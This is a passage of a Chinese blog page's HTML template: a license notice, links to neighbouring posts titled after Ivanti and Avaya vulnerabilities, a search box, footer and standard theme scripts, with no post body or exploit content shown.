        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2025/06/03/github_3979221664/" title="Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Ivanti EPMM Authentication Bypass for Expression Language Remote Code Execution</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2025/06/03/github_2885415560/" title="Avaya Aura Device Services OS Command Injection Vulnerability">
                        <span class="hidden-mobile">Avaya Aura Device Services OS Command Injection Vulnerability</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
